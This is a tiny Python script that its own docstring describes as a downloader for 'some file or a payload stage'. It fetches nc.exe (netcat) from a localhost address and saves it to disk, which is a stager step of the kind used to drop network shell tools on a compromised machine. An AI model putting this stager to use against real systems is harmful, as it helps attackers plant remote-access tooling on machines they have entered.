'''
very simple script to download some file or a payload stage
'''

import requests

url = 'http://127.0.0.1/nc.exe'
filename = 'nc.exe'

response = requests.get(url)

with open(filename, 'wb') as f:
    f.write(response.content)

print('File downloaded')
